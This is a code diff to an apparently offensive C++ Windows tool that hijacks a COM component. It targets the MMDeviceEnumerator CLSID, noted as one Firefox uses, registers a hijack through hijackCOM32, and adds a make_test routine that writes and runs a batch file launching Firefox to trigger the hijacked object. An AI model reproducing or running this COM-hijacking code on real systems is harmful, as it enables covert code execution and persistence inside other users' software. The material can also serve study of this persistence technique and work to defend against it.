@@ -10,6 +10,7 @@
 #include "resource.h"
 #include "sysutil.h"
 
+
 //CLSID of the COM component that you want to hijack:
 std::string COM_clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"; // CLSID_MMDeviceEnumerator (used i.e. by Firefox)
 
@@ -25,11 +26,25 @@ std::string clsidToString(const IID &clsid)
     return my_clsid;
 }
 
-std::string makeTest()
+std::string getTestClsid()
 {
     return clsidToString(CLSID_CUrlHistory);
 }
 
+void make_test()
+{
+    char test_cmd[] = "test.bat";
+    FILE *f = fopen(test_cmd, "w");
+    if (!f) {
+        return;
+    }
+
+    fprintf(f,"\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"\n" );
+    fclose(f);
+
+    printf("Deploying a test...\n");
+    WinExec(test_cmd, SW_SHOWNORMAL);
+}
 bool hijackCOM32(std::string com_clsid, char *path_buffer, DWORD &val_len)
 {
     printf("[*] Trying to hijack: %s\n", com_clsid.c_str());
@@ -117,6 +132,7 @@ int main(int argc, char *argv[])
     } else {
         printf("[-] COM Hijacking failed!");
     }
+    make_test();
     system("pause");
     return 0;
 }
